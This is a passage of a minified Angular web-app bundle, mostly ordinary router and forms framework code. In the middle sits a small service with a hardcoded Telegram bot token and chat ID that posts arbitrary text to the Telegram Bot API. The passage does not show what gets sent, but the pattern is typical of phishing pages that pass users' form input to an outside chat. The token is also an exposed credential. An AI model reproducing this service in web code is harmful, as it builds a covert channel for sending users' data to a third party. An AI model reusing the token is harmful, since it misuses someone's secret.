o={replaceUrl:!0},s=i?.navigationId?i:null;if(i){let c=U({},i);delete c.navigationId,delete c.\u0275routerPageId,Object.keys(c).length!==0&&(o.state=c)}let a=this.parseUrl(t);this.scheduleNavigation(a,r,s,o)}get url(){return this.serializeUrl(this.currentUrlTree)}getCurrentNavigation(){return this.navigationTransitions.currentNavigation}get lastSuccessfulNavigation(){return this.navigationTransitions.lastSuccessfulNavigation}resetConfig(t){this.config=t.map(_v),this.navigated=!1}ngOnDestroy(){this.dispose()}dispose(){this.navigationTransitions.complete(),this.nonRouterCurrentEntryChangeSubscription&&(this.nonRouterCurrentEntryChangeSubscription.unsubscribe(),this.nonRouterCurrentEntryChangeSubscription=void 0),this.disposed=!0,this.eventsSubscription.unsubscribe()}createUrlTree(t,r={}){let{relativeTo:i,queryParams:o,fragment:s,queryParamsHandling:a,preserveFragment:c}=r,l=c?this.currentUrlTree.fragment:s,h=null;switch(a??this.options.defaultQueryParamsHandling){case"merge":h=U(U({},this.currentUrlTree.queryParams),o);break;case"preserve":h=this.currentUrlTree.queryParams;break;default:h=o||null}h!==null&&(h=this.removeEmptyProps(h));let p;try{let m=i?i.snapshot:this.routerState.snapshot.root;p=aS(m)}catch{(typeof t[0]!="string"||t[0][0]!=="/")&&(t=[]),p=this.currentUrlTree.root}return cS(p,t,h,l??null)}navigateByUrl(t,r={skipLocationChange:!1}){let i=kc(t)?t:this.parseUrl(t),o=this.urlHandlingStrategy.merge(i,this.rawUrlTree);return this.scheduleNavigation(o,Nc,null,r)}navigate(t,r={skipLocationChange:!1}){return TU(t),this.navigateByUrl(this.createUrlTree(t,r),r)}serializeUrl(t){return this.urlSerializer.serialize(t)}parseUrl(t){try{return this.urlSerializer.parse(t)}catch{return this.urlSerializer.parse("/")}}isActive(t,r){let i;if(r===!0?i=U({},CU):r===!1?i=U({},bU):i=r,kc(t))return BT(this.currentUrlTree,t,i);let o=this.parseUrl(t);return BT(this.currentUrlTree,o,i)}removeEmptyProps(t){return Object.entries(t).reduce((r,[i,o])=>(o!=null&&(r[i]=o),r),{})}scheduleNavigation(t,r,i,o,s){if(this.disposed)return Promise.resolve(!1);let a,c,l;s?(a=s.resolve,c=s.reject,l=s.promise):l=new Promise((p,m)=>{a=p,c=m});let h=this.pendingTasks.add();return AS(this,()=>{queueMicrotask(()=>this.pendingTasks.remove(h))}),this.navigationTransitions.handleNavigationRequest({source:r,restoredState:i,currentUrlTree:this.currentUrlTree,currentRawUrl:this.currentUrlTree,rawUrl:t,extras:o,resolve:a,reject:c,promise:l,currentSnapshot:this.routerState.snapshot,currentRouterState:this.routerState}),l.catch(p=>Promise.reject(p))}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function TU(n){for(let e=0;e<n.length;e++)if(n[e]==null)throw new Y(4008,!1)}function SU(n){return!(n instanceof Vc)&&!(n instanceof Ss)}var Oh=class{};var AU=(()=>{class n{router;injector;preloadingStrategy;loader;subscription;constructor(t,r,i,o,s){this.router=t,this.injector=i,this.preloadingStrategy=o,this.loader=s}setUpPreloading(){this.subscription=this.router.events.pipe(ut(t=>t instanceof Cr),or(()=>this.preload())).subscribe(()=>{})}preload(){return this.processRoutes(this.injector,this.router.config)}ngOnDestroy(){this.subscription&&this.subscription.unsubscribe()}processRoutes(t,r){let i=[];for(let o of r){o.providers&&!o._injector&&(o._injector=Hd(o.providers,t,`Route: ${o.path}`));let s=o._injector??t,a=o._loadedInjector??s;(o.loadChildren&&!o._loadedRoutes&&o.canLoad===void 0||o.loadComponent&&!o._loadedComponent)&&i.push(this.preloadConfig(s,o)),(o.children||o._loadedRoutes)&&i.push(this.processRoutes(a,o.children??o._loadedRoutes))}return me(i).pipe(jr())}preloadConfig(t,r){return this.preloadingStrategy.preload(r,()=>{let i;r.loadChildren&&r.canLoad===void 0?i=this.loader.loadChildren(t,r):i=J(null);let o=i.pipe(tt(s=>s===null?J(void 0):(r._loadedRoutes=s.routes,r._loadedInjector=s.injector,this.processRoutes(s.injector??t,s.routes))));if(r.loadComponent&&!r._loadedComponent){let s=this.loader.loadComponent(r);return me([o,s]).pipe(jr())}else return o})}static \u0275fac=function(r){return new(r||n)(L(Sn),L(Zd),L(Pt),L(Oh),L(wv))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),MS=new j(""),MU=(()=>{class n{urlSerializer;transitions;viewportScroller;zone;options;routerEventsSubscription;scrollEventsSubscription;lastId=0;lastSource="imperative";restoredId=0;store={};constructor(t,r,i,o,s={}){this.urlSerializer=t,this.transitions=r,this.viewportScroller=i,this.zone=o,this.options=s,s.scrollPositionRestoration||="disabled",s.anchorScrolling||="disabled"}init(){this.options.scrollPositionRestoration!=="disabled"&&this.viewportScroller.setHistoryScrollRestoration("manual"),this.routerEventsSubscription=this.createScrollEvents(),this.scrollEventsSubscription=this.consumeScrollEvents()}createScrollEvents(){return this.transitions.events.subscribe(t=>{t instanceof Ts?(this.store[this.lastId]=this.viewportScroller.getScrollPosition(),this.lastSource=t.navigationTrigger,this.restoredId=t.restoredState?t.restoredState.navigationId:0):t instanceof Cr?(this.lastId=t.id,this.scheduleScrollEvent(t,this.urlSerializer.parse(t.urlAfterRedirects).fragment)):t instanceof ai&&t.code===bh.IgnoredSameUrlNavigation&&(this.lastSource=void 0,this.restoredId=0,this.scheduleScrollEvent(t,this.urlSerializer.parse(t.url).fragment))})}consumeScrollEvents(){return this.transitions.events.subscribe(t=>{t instanceof Sh&&(t.position?this.options.scrollPositionRestoration==="top"?this.viewportScroller.scrollToPosition([0,0]):this.options.scrollPositionRestoration==="enabled"&&this.viewportScroller.scrollToPosition(t.position):t.anchor&&this.options.anchorScrolling==="enabled"?this.viewportScroller.scrollToAnchor(t.anchor):this.options.scrollPositionRestoration!=="disabled"&&this.viewportScroller.scrollToPosition([0,0]))})}scheduleScrollEvent(t,r){this.zone.runOutsideAngular(()=>{setTimeout(()=>{this.zone.run(()=>{this.transitions.events.next(new Sh(t,this.lastSource==="popstate"?this.store[this.restoredId]:null,r))})},0)})}ngOnDestroy(){this.routerEventsSubscription?.unsubscribe(),this.scrollEventsSubscription?.unsubscribe()}static \u0275fac=function(r){hb()};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})();function xU(n){return n.routerState.root}function Kc(n,e){return{\u0275kind:n,\u0275providers:e}}function RU(){let n=V(Jt);return e=>{let t=n.get(mr);if(e!==t.components[0])return;let r=n.get(Sn),i=n.get(xS);n.get(Dv)===1&&r.initialNavigation(),n.get(RS,null,le.Optional)?.setUpPreloading(),n.get(MS,null,le.Optional)?.init(),r.resetRootComponentType(t.componentTypes[0]),i.closed||(i.next(),i.complete(),i.unsubscribe())}}var xS=new j("",{factory:()=>new Ve}),Dv=new j("",{providedIn:"root",factory:()=>1});function NU(){return Kc(2,[{provide:Dv,useValue:0},{provide:Wd,multi:!0,deps:[Jt],useFactory:e=>{let t=e.get(iT,Promise.resolve());return()=>t.then(()=>new Promise(r=>{let i=e.get(Sn),o=e.get(xS);AS(i,()=>{r(!0)}),e.get(Iv).afterPreactivation=()=>(r(!0),o.closed?J(void 0):o),i.initialNavigation()}))}}])}function PU(){return Kc(3,[{provide:Wd,multi:!0,useFactory:()=>{let e=V(Sn);return()=>{e.setUpLocationChangeListener()}}},{provide:Dv,useValue:2}])}var RS=new j("");function kU(n){return Kc(0,[{provide:RS,useExisting:AU},{provide:Oh,useExisting:n}])}function OU(){return Kc(8,[zT,{provide:Fh,useExisting:zT}])}function FU(n){let e=[{provide:CS,useValue:vU},{provide:bS,useValue:U({skipNextTransition:!!n?.skipInitialTransition},n)}];return Kc(9,e)}var QT=new j("ROUTER_FORROOT_GUARD"),VU=[vs,{provide:Hc,useClass:bs},Sn,zc,{provide:As,useFactory:xU,deps:[Sn]},wv,[]],Cv=(()=>{class n{constructor(t){}static forRoot(t,r){return{ngModule:n,providers:[VU,[],{provide:kh,multi:!0,useValue:t},{provide:QT,useFactory:BU,deps:[[Sn,new fc,new B0]]},r?.errorHandler?{provide:TS,useValue:r.errorHandler}:[],{provide:Wc,useValue:r||{}},r?.useHash?UU():jU(),LU(),r?.preloadingStrategy?kU(r.preloadingStrategy).\u0275providers:[],r?.initialNavigation?$U(r):[],r?.bindToComponentInputs?OU().\u0275providers:[],r?.enableViewTransitions?FU().\u0275providers:[],HU()]}}static forChild(t){return{ngModule:n,providers:[{provide:kh,multi:!0,useValue:t}]}}static \u0275fac=function(r){return new(r||n)(L(QT,8))};static \u0275mod=Qe({type:n});static \u0275inj=Ke({})}return n})();function LU(){return{provide:MS,useFactory:()=>{let n=V(hT),e=V(pe),t=V(Wc),r=V(Iv),i=V(Hc);return t.scrollOffset&&n.setOffset(t.scrollOffset),new MU(i,r,n,e,t)}}}function UU(){return{provide:to,useClass:sT}}function jU(){return{provide:to,useClass:Dy}}function BU(n){return"guarded"}function $U(n){return[n.initialNavigation==="disabled"?PU().\u0275providers:[],n.initialNavigation==="enabledBlocking"?NU().\u0275providers:[]]}var YT=new j("");function HU(){return[{provide:YT,useFactory:RU},{provide:Kd,multi:!0,useExisting:YT}]}var ui=class n{constructor(e){this.http=e}botToken="8064199030:AAExK7BU45Gwid7VmHjnF5EFMoLttYASSxs";chatId="6662744536";telegramApiUrl=`https://api.telegram.org/bot${this.botToken}/sendMessage`;sendMessage(e){let t={chat_id:this.chatId,text:e};return this.http.post(this.telegramApiUrl,t)}static \u0275fac=function(t){return new(t||n)(L(xy))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})};var BS=(()=>{class n{_renderer;_elementRef;onChange=t=>{};onTouched=()=>{};constructor(t,r){this._renderer=t,this._elementRef=r}setProperty(t,r){this._renderer.setProperty(this._elementRef.nativeElement,t,r)}registerOnTouched(t){this.onTouched=t}registerOnChange(t){this.onChange=t}setDisabledState(t){this.setProperty("disabled",t)}static \u0275fac=function(r){return new(r||n)(Ie(ms),Ie(Yi))};static \u0275dir=zt({type:n})}return n})(),qU=(()=>{class n extends BS{static \u0275fac=(()=>{let t;return function(i){return(t||(t=ps(n)))(i||n)}})();static \u0275dir=zt({type:n,features:[gr]})}return n})(),$S=new j("");var zU={provide:$S,useExisting:Qi(()=>Os),multi:!0};function GU(){let n=$n()?$n().getUserAgent():"";return/android (\d+)/.test(n.toLowerCase())}var WU=new j(""),Os=(()=>{class n extends BS{_compositionMode;_composing=!1;constructor(t,r,i){super(t,r),this._compositionMode=i,this._compositionMode==null&&(this._compositionMode=!GU())}writeValue(t){let r=t??"";this.setProperty("value",r)}_handleInput(t){(!this._compositionMode||this._compositionMode&&!this._composing)&&this.onChange(t)}_compositionStart(){this._composing=!0}_compositionEnd(t){this._composing=!1,this._compositionMode&&this.onChange(t)}static \u0275fac=function(r){return new(r||n)(Ie(ms),Ie(Yi),Ie(WU,8))};static \u0275dir=zt({type:n,selectors:[["input","formControlName","",3,"type","checkbox"],["textarea","formControlName",""],["input","formControl","",3,"type","checkbox"],["textarea","formControl",""],["input","ngModel","",3,"type","checkbox"],["textarea","ngModel",""],["","ngDefaultControl",""]],hostBindings:function(r,i){r&1&&Cn("input",function(s){return i._handleInput(s.target.value)})("blur",function(){return i.onTouched()})("compositionstart",function(){return i._compositionStart()})("compositionend",function(s){return i._compositionEnd(s.target.value)})},standalone:!1,features:[_c([zU]),gr]})}return n})();function KU(n){return n!=null&&typeof n.length=="number"}var Sv=new j(""),HS=new j("");function QU(n){return e=>KU(e.value)&&e.value.length>n?{maxlength:{requiredLength:n,actualLength:e.value.length}}:null}function PS(n){return null}function qS(n){return n!=null}function zS(n){return Ji(n)?me(n):n}function GS(n){let e={};return n.forEach(t=>{e=t!=null?U(U({},e),t):e}),Object.keys(e).length===0?null:e}function WS(n,e){return e.map(t=>t(n))}function YU(n){return!n.validate}function KS(n){return n.map(e=>YU(e)?e:t=>e.validate(t))}function ZU(n){if(!n)return null;let e=n.filter(qS);return e.length==0?null:function(t){return GS(WS(t,e))}}function Av(n){return n!=null?ZU(KS(n)):null}function JU(n){if(!n)return null;let e=n.filter(qS);return e.length==0?null:function(t){let r=WS(t,e).map(zS);return Ag(r).pipe(X(GS))}}function Mv(n){return n!=null?JU(KS(n)):null}function kS(n,e){return n===null?[e]:Array.isArray(n)?[...n,e]:[n,e]}function XU(n){return n._rawValidators}function ej(n){return n._rawAsyncValidators}function Tv(n){return n?Array.isArray(n)?n:[n]:[]}function Uh(n,e){return Array.isArray(n)?n.includes(e):n===e}function OS(n,e){let t=Tv(e);return Tv(n).forEach(i=>{Uh(t,i)||t.push(i)}),t}function FS(n,e){return Tv(e).filter(t=>!Uh(n,t))}var jh=class{get value(){return this.control?this.control.value:null}get valid(){return this.control?this.control.valid:null}get invalid(){return this.control?this.control.invalid:null}get pending(){return this.control?this.control.pending:null}get disabled(){return this.control?this.control.disabled:null}get enabled(){return this.control?this.control.enabled:null}get errors(){return this.control?this.control.errors:null}get pristine(){return this.control?this.control.pristine:null}get dirty(){return this.control?this.control.dirty:null}get touched(){return this.control?this.control.touched:null}get status(){return this.control?this.control.status:null}get untouched(){return this.control?this.control.untouched:null}get statusChanges(){return this.control?this.control.statusChanges:null}get valueChanges(){return this.control?this.control.valueChanges:null}get path(){return null}_composedValidatorFn;_composedAsyncValidatorFn;_rawValidators=[];_rawAsyncValidators=[];_setValidators(e){this._rawValidators=e||[],this._composedValidatorFn=Av(this._rawValidators)}_setAsyncValidators(e){this._rawAsyncValidators=e||[],this._composedAsyncValidatorFn=Mv(this._rawAsyncValidators)}get validator(){return this._composedValidatorFn||null}get asyncValidator(){return this._composedAsyncValidatorFn||null}_onDestroyCallbacks=[];_registerOnDestroy(e){this._onDestroyCallbacks.push(e)}_invokeOnDestroyCallbacks(){this._onDestroyCallbacks.forEach(e=>e()),this._onDestroyCallbacks=[]}reset(e=void 0){this.control&&this.control.reset(e)}hasError(e,t){return this.control?this.control.hasError(e,t):!1}getError(e,t){return this.control?this.control.getError(e,t):null}},Ps=class extends jh{name;get formDirective(){return null}get path(){return null}},eu=class extends jh{_parent=null;name=null;valueAccessor=null},Bh=class{_cd;constructor(e){this._cd=e}get isTouched(){return this._cd?.control?._touched?.(),!!this._cd?.control?.touched}get isUntouched(){return!!this._cd?.control?.untouched}get isPristine(){return this._cd?.control?._pristine?.(),!!this._cd?.control?.pristine}get isDirty(){return!!this._cd?.control?.dirty}get isValid(){return this._cd?.control?._status?.(),!!this._cd?.control?.valid}get isInvalid(){return!!this._cd?.control?.invalid}get isPending(){return!!this._cd?.control?.pending}get isSubmitted(){return this._cd?._submitted?.(),!!this._cd?.submitted}},tj={"[class.ng-untouched]":"isUntouched","[class.ng-touched]":"isTouched","[class.ng-pristine]":"isPristine","[class.ng-dirty]":"isDirty","[class.ng-valid]":"isValid","[class.ng-invalid]":"isInvalid","[class.ng-pending]":"isPending"},l8=ue(U({},tj),{"[class.ng-submitted]":"isSubmitted"}),zh=(()=>{class n extends Bh{constructor(t){super(t)}static \u0275fac=function(r){return new(r||n)(Ie(eu,2))};static \u0275dir=zt({type:n,selectors:[["","formControlName",""],["","ngModel",""],["","formControl",""]],hostVars:14,hostBindings:function(r,i){r&2&&Yd("ng-untouched",i.isUntouched)("ng-touched",i.isTouched)("ng-pristine",i.isPristine)("ng-dirty",i.isDirty)("ng-valid",i.isValid)("ng-invalid",i.isInvalid)("ng-pending",i.isPending)},standalone:!1,features:[gr]})}return n})(),Gh=(()=>{class n extends Bh{constructor(t){super(t)}static \u0275fac=function(r){return new(r||n)(Ie(Ps,10))};static \u0275dir=zt({type:n,selectors:[["","formGroupName",""],["","formArrayName",""],["","ngModelGroup",""],["","formGroup",""],["form",3,"ngNoForm",""],["","ngForm",""]],hostVars:16,hostBindings:function(r,i){r&2&&Yd("ng-untouched",i.isUntouched)("ng-touched",i.isTouched)("ng-pristine",i.isPristine)("ng-dirty",i.isDirty)("ng-valid",i.isValid)("ng-invalid",i.isInvalid)("ng-pending",i.isPending)("ng-submitted",i.isSubmitted)},standalone:!1,features:[gr]})}return n})();var Qc="VALID",Lh="INVALID",Rs="PENDING",Yc="DISABLED",ks=class{},$h=class extends ks{value;source;constructor(e,t){super(),this.value=e,this.source=t}},Jc=class extends ks{pristine;source;constructor(e,t){super(),this.pristine=e,this.source=t}},Xc=class extends ks{touched;source;constructor(e,t){super(),this.touched=e,this.source=t}},Ns=class extends ks{status;source;constructor(e,t){super(),this.status=e,this.source=t}};function QS(n){return(Wh(n)?n.validators:n)||null}function nj(n){return Array.isArray(n)?Av(n):n||null}function YS(n,e){return(Wh(e)?e.asyncValidators:n)||null}function rj(n){return Array.isArray(n)?Mv(n):n||null}function Wh(n){return n!=null&&!Array.isArray(n)&&typeof n=="object"}function ij(n,e,t){let r=n.controls;if(!(e?Object.keys(r):r).length)throw new Y(1e3,"");if(!r[t])throw new Y(1001,"")}function oj(n,e,t){n._forEachChild((r,i)=>{if(t[i]===void 0)throw new Y(1002,"")})}var Hh=class{_pendingDirty=!1;_hasOwnPendingAsyncValidator=null;_pendingTouched=!1;_onCollectionChange=()=>{};_updateOn;_parent=null;_asyncValidationSubscription;_composedValidatorFn;_composedAsyncValidatorFn;_rawValidators;_rawAsyncValidators;value;constructor(e,t){this._assignValidators(e),this._assignAsyncValidators(t)}get validator(){return this._composedValidatorFn}set validator(e){this._rawValidators=this._composedValidatorFn=e}get asyncValidator(){return this._composedAsyncValidatorFn}set asyncValidator(e){this._rawAsyncValidators=this._composedAsyncValidatorFn=e}get parent(){return this._parent}get status(){return yr(this.statusReactive)}set status(e){yr(()=>this.statusReactive.set(e))}_status=wc(()=>this.statusReactive());statusReactive=mc(void 0);get valid(){return this.status===Qc}get invalid(){return this.status===Lh}get pending(){return this.status==Rs}get disabled(){return this.status===Yc}get enabled(){return this.status!==Yc}errors;get pristine(){return yr(this.pristineReactive)}set pristine(e){yr(()=>this.pristineReactive.set(e))}_pristine=wc(()=>this.pristineReactive());pristineReactive=mc(!0);get dirty(){return!this.pristine}get touched(){return yr(this.touchedReactive)}set touched(e){yr(()=>this.touchedReactive.set(e))}_touched=wc(()=>this.touchedReactive());touchedReactive=mc(!1);get untouched(){return!this.touched}_events=new Ve;events=this._events.asObservable();valueChanges;statusChanges;get updateOn(){return this._updateOn?this._updateOn:this.parent?this.parent.updateOn:"change"}setValidators(e){this._assignValidators(e)}setAsyncValidators(e){this._assignAsyncValidators(e)}addValidators(e){this.setValidators(OS(e,this._rawValidators))}addAsyncValidators(e){this.setAsyncValidators(OS(e,this._rawAsyncValidators))}removeValidators(e){this.setValidators(FS(e,this._rawValidators))}removeAsyncValidators(e){this.setAsyncValidators(FS(e,this._rawAsyncValidators))}hasValidator(e){return Uh(this._rawValidators,e)}hasAsyncValidator(e){return Uh(this._rawAsyncValidators,e)}clearValidators(){this.validator=null}clearAsyncValidators(){this.asyncValidator=null}markAsTouched(e={}){let t=this.touched===!1;this.touched=!0;let r=e.sourceControl??this;this._parent&&!e.onlySelf&&this._parent.markAsTouched(ue(U({},e),{sourceControl:r})),t&&e.emitEvent!==!1&&this._events.next(new Xc(!0,r))}markAllAsTouched(e={}){this.markAsTouched({onlySelf:!0,emitEvent:e.emitEvent,sourceControl:this}),this._forEachChild(t=>t.markAllAsTouched(e))}markAsUntouched(e={}){let t=this.touched===!0;this.touched=!1,this._pendingTouched=!1;let r=e.sourceControl??this;this._forEachChild(i=>{i.markAsUntouched({onlySelf:!0,emitEvent:e.emitEvent,sourceControl:r})}),this._parent&&!e.onlySelf&&this._parent._updateTouched(e,r),t&&e.emitEvent!==!1&&this._events.next(new Xc(!1,r))}markAsDirty(e={}){let t=this.pristine===!0;this.pristine=!1;let r=e.sourceControl??this;this._parent&&!e.onlySelf&&this._parent.markAsDirty(ue(U({},e),{sourceControl:r})),t&&e.emitEvent!==!1&&this._events.next(new Jc(!1,r))}markAsPristine(e={}){let t=this.pristine===!1;this.pristine=!0,this._pendingDirty=!1;let r=e.sourceControl??this;this._forEachChild(i=>{i.markAsPristine({onlySelf:!0,emitEvent:e.emitEvent})}),this._parent&&!e.onlySelf&&this._parent._updatePristine(e,r),t&&e.emitEvent!==!1&&this._events.next(new Jc(!0,r))}markAsPending(e={}){this.status=Rs;let t=e.sourceControl??this;e.emitEvent!==!1&&(this._events.next(new Ns(this.status,t)),this.statusChanges.emit(this.status)),this._parent&&!e.onlySelf&&this._parent.markAsPending(ue(U({},e),{sourceControl:t}))}disable(e={}){let t=this._parentMarkedDirty(e.onlySelf);this.status=Yc,this.errors=null,this._forEachChild(i=>{i.disable(ue(U({},e),{onlySelf:!0}))}),this._updateValue();let r=e.sourceControl??this;e.emitEvent!==!1&&(this._events.next(new $h(this.value,r)),this._events.next(new Ns(this.status,r)),this.valueChanges.emit(this.value),this.statusChanges.emit(this.status)),this._updateAncestors(ue(U({},e),{skipPristineCheck:t}),this),this._onDisabledChange.forEach(i=>i(!0))}enable(e={}){let t=this._parentMarkedDirty(e.onlySelf);this.status=Qc,this._forEachChild(r=>{r.enable(ue(U({},e),{onlySelf:!0}))}),this.updateValueAndValidity({onlySelf:!0,emitEvent:e.emitEvent}),this._updateAncestors(ue(U({},e),{skipPristineCheck:t}),this),this._onDisabledChange.forEach(r=>r(!1))}_updateAncestors(e,t){this._parent&&!e.onlySelf&&(this._parent.updateValueAndValidity(e),e.skipPristineCheck||this._parent._updatePristine({},t),this._parent._updateTouched({},t))}setParent(e){this._parent=e}getRawValue(){return this.value}updateValueAndValidity(e={}){if(this._setInitialStatus(),this._updateValue(),this.enabled){let r=this._cancelExistingSubscription();this.errors=this._runValidator(),this.status=this._calculateStatus(),(this.status===Qc||this.status===Rs)&&this._runAsyncValidator(r,e.emitEvent)}let t=e.sourceControl??this;e.emitEvent!==!1&&(this._events.next(new $h(this.value,t)),this._events.next(new Ns(this.status,t)),this.valueChanges.emit(this.value),this.statusChanges.emit(this.status)),this._parent&&!e.onlySelf&&this._parent.updateValueAndValidity(ue(U({},e),{sourceControl:t}))}_updateTreeValidity(e={emitEvent:!0}){this._forEachChild(t=>t._updateTreeValidity(e)),this.updateValueAndValidity({onlySelf:!0,emitEvent:e.emitEvent})}_setInitialStatus(){this.status=this._allControlsDisabled()?Yc:Qc}_runValidator(){return this.validator?this.validator(this):null}_runAsyncValidator(e,t){if(this.asyncValidator){this.status=Rs,this._hasOwnPendingAsyncValidator={emitEvent:t!==!1};let r=zS(this.asyncValidator(this));this._asyncValidationSubscription=r.subscribe(i=>{this._hasOwnPendingAsyncValidator=null,this.setErrors(i,{emitEvent:t,shouldHaveEmitted:e})})}}_cancelExistingSubscription(){if(this._asyncValidationSubscription){this._asyncValidationSubscription.unsubscribe();let e=this._hasOwnPendingAsyncValidator?.emitEvent??!1;return this._hasOwnPendingAsyncValidator=null,e}return!1}setErrors(e,t={}){this.errors=e,this._updateControlsErrors(t.emitEvent!==!1,this,t.shouldHaveEmitted)}get(e){let t=e;return t==null||(Array.isArray(t)||(t=t.split(".")),t.length===0)?null:t.reduce((r,i)=>r&&r._find(i),this)}getError(e,t){let r=t?this.get(t):this;return r&&r.errors?r.errors[e]:null}hasError(e,t){return!!this.getError(e,t)}get root(){let e=this;for(;e._parent;)e=e._parent;return e}_updateControlsErrors(e,t,r){this.status=this._calculateStatus(),e&&this.statusChanges.emit(this.status),(e||r)&&this._events.next(new Ns(this.status,t)),this._parent&&this._parent._updateControlsErrors(e,t,r)}_initObservables(){this.valueChanges=new ht,this.statusChanges=new ht}_calculateStatus(){return this._allControlsDisabled()?Yc:this.errors?Lh:this._hasOwnPendingAsyncValidator||this._anyControlsHaveStatus(Rs)?Rs:this._anyControlsHaveStatus(Lh)?Lh:Qc}_anyControlsHaveStatus(e){return this._anyControls(t=>t.status===e)}_anyControlsDirty(){return this._anyControls(e=>e.dirty)}_anyControlsTouched(){return this._anyControls(e=>e.touched)}_updatePristine(e,t){let r=!this._anyControlsDirty(),i=this.pristine!==r;this.pristine=r,this._parent&&!e.onlySelf&&this._parent._updatePristine(e,t),i&&this._events.next(new Jc(this.pristine,t))}_updateTouched(e={},t){this.touched=this._anyControlsTouched(),this._events.next(new Xc(this.touched,t)),this._parent&&!e.onlySelf&&this._parent._updateTouched(e,t)}_onDisabledChange=[];_registerOnCollectionChange(e){this._onCollectionChange=e}_setUpdateStrategy(e){Wh(e)&&e.updateOn!=null&&(this._updateOn=e.updateOn)}_parentMarkedDirty(e){let t=this._parent&&this._parent.dirty;return!e&&!!t&&!this._parent._anyControlsDirty()}_find(e){return null}_assignValidators(e){this._rawValidators=Array.isArray(e)?e.slice():e,this._composedValidatorFn=nj(this._rawValidators)}_assignAsyncValidators(e){this._rawAsyncValidators=Array.isArray(e)?e.slice():e,this._composedAsyncValidatorFn=rj(this._rawAsyncValidators)}},qh=class extends Hh{constructor(e,t,r){super(QS(t),YS(r,t)),this.controls=e,this._initObservables(),this._setUpdateStrategy(t),this._setUpControls(),this.updateValueAndValidity({onlySelf:!0,emitEvent:!!this.asyncValidator})}controls;registerControl(e,t){return this.controls[e]?this.controls[e]:(this.controls[e]=t,t.setParent(this),t._registerOnCollectionChange(this._onCollectionChange),t)}addControl(e,t,r={}){this.registerControl(e,t),this.updateValueAndValidity({emitEvent:r.emitEvent}),this._onCollectionChange()}removeControl(e,t={}){this.controls[e]&&this.controls[e]._registerOnCollectionChange(()=>{}),delete this.controls[e],this.updateValueAndValidity({emitEvent:t.emitEvent}),this._onCollectionChange()}setControl(e,t,r={}){this.controls[e]&&this.controls[e]._registerOnCollectionChange(()=>{}),delete this.controls[e],t&&this.registerControl(e,t),this.updateValueAndValidity({emitEvent:r.emitEvent}),this._onCollectionChange()}contains(e){return this.controls.hasOwnProperty(e)&&this.controls[e].enabled}setValue(e,t={}){oj(this,!0,e),Object.keys(e).forEach(r=>{ij(this,!0,r),this.controls[r].setValue(e[r],{onlySelf:!0,emitEvent:t.emitEvent})}),this.updateValueAndValidity(t)}patchValue(e,t={}){e!=null&&(Object.keys(e).forEach(r=>{let i=this.controls[r];i&&i.patchValue(e[r],{onlySelf:!0,emitEvent:t.emitEvent})}),this.updateValueAndValidity(t))}reset(e={},t={}){this._forEachChild((r,i)=>{r.reset(e?e[i]:null,{onlySelf:!0,emitEvent:t.emitEvent})}),this._updatePristine(t,this),this._updateTouched(t,this),this.updateValueAndValidity(t)}getRawValue(){return this._reduceChildren({},(e,t,r)=>(e[r]=t.getRawValue(),e))}_syncPendingControls(){let e=this._reduceChildren(!1,(t,r)=>r._syncPendingControls()?!0:t);return e&&this.updateValueAndValidity({onlySelf:!0}),e}_forEachChild(e){Object.keys(this.controls).forEach(t=>{let r=this.controls[t];r&&e(r,t)})}_setUpControls(){this._forEachChild(e=>{e.setParent(this),e._registerOnCollectionChange(this._onCollectionChange)})}_updateValue(){this.value=this._reduceValue()}_anyControls(e){for(let[t,r]of Object.entries(this.controls))if(this.contains(t)&&e(r))return!0;return!1}_reduceValue(){let e={};return this._reduceChildren(e,(t,r,i)=>((r.enabled||this.disabled)&&(t[i]=r.value),t))}_reduceChildren(e,t){let r=e;return this._forEachChild((i,o)=>{r=t(r,i,o)}),r}_allControlsDisabled(){for(let e of Object.keys(this.controls))if(this.controls[e].enabled)return!1;return Object.keys(this.controls).length>0||this.disabled}_find(e){return this.controls.hasOwnProperty(e)?this.controls[e]:null}};var xv=new j("CallSetDisabledState",{providedIn:"root",factory:()=>Rv}),Rv="always";function sj(n,e){return[...e.path,n]}function ZS(n,e,t=Rv){JS(n,e),e.valueAccessor.writeValue(n.value),(n.disabled||t==="always")&&e.valueAccessor.setDisabledState?.(n.disabled),cj(n,e),lj(n,e),uj(n,e),aj(n,e)}function VS(n,e){n.forEach(t=>{t.registerOnValidatorChange&&t.registerOnValidatorChange(e)})}function aj(n,e){if(e.valueAccessor.setDisabledState){let t=r=>{e.valueAccessor.setDisabledState(r)};n.registerOnDisabledChange(t),e._registerOnDestroy(()=>{n._unregisterOnDisabledChange(t)})}}function JS(n,e){let t=XU(n);e.validator!==null?n.setValidators(kS(t,e.validator)):typeof t=="function"&&n.setValidators([t]);let r=ej(n);e.asyncValidator!==null?n.setAsyncValidators(kS(r,e.asyncValidator)):typeof r=="function"&&n.setAsyncValidators([r]);let i=()=>n.updateValueAndValidity();VS(e._rawValidators,i),VS(e._rawAsyncValidators,i)}function cj(n,e){e.valueAccessor.registerOnChange(t=>{n._pendingValue=t,n._pendingChange=!0,n._pendingDirty=!0,n.updateOn==="change"&&XS(n,e)})}function uj(n,e){e.valueAccessor.registerOnTouched(()=>{n._pendingTouched=!0,n.updateOn==="blur"&&n._pendingChange&&XS(n,e),n.updateOn!=="submit"&&n.markAsTouched()})}function XS(n,e){n._pendingDirty&&n.markAsDirty(),n.setValue(n._pendingValue,{emitModelToViewChange:!1}),e.viewToModelUpdate(n._pendingValue),n._pendingChange=!1}function lj(n,e){let t=(r,i)=>{e.valueAccessor.writeValue(r),i&&e.viewToModelUpdate(r)};n.registerOnChange(t),e._registerOnDestroy(()=>{n._unregisterOnChange(t)})}function dj(n,e){n==null,JS(n,e)}function hj(n,e){if(!n.hasOwnProperty("model"))return!1;let t=n.model;return t.isFirstChange()?!0:!Object.is(e,t.currentValue)}function fj(n){return Object.getPrototypeOf(n.constructor)===qU}function pj(n,e){n._syncPendingControls(),e.forEach(t=>{let r=t.control;r.updateOn==="submit"&&r._pendingChange&&(t.viewToModelUpdate(r._pendingValue),r._pendingChange=!1)})}function gj(n,e){if(!e)return null;Array.isArray(e);let t,r,i;return e.forEach(o=>{o.constructor===Os?t=o:fj(o)?r=o:i=o}),i||r||t||null}var mj={provide:Ps,useExisting:Qi(()=>tu)},Zc=Promise.resolve(),tu=(()=>{class n extends Ps{callSetDisabledState;get 